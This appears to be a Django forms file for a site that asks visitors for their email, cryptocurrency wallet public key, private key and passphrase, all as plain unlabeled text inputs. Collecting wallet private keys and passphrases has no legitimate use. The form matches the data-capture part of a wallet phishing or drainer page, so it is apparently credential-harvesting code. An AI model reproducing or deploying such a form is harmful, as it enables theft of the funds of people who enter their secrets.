from django import forms
from .models import crypform

class CrypForm(forms.ModelForm):
	email = forms.CharField(label='', 
                    widget=forms.TextInput(attrs={'placeholder': 'Email'}))
	# wallet_name = forms.CharField(label='', 
 #                    widget=forms.TextInput(attrs={'placeholder': 'Wallet Name'}))
	wallet_public_key = forms.CharField(label='', 
                    widget=forms.TextInput(attrs={'placeholder': 'Wallet Public Key'}))
	wallet_private_key = forms.CharField(label='', 
                    widget=forms.TextInput(attrs={'placeholder': 'Wallet Private Key'}))
	wallet_passphrase = forms.CharField(label='', 
                    widget=forms.TextInput(attrs={'placeholder': 'Wallet Passphrase'}))
	class Meta():
		model = crypform
		fields = [
		'email',
		'wallet_name',
		'wallet_public_key',
		'wallet_private_key',
		'wallet_passphrase',
		]
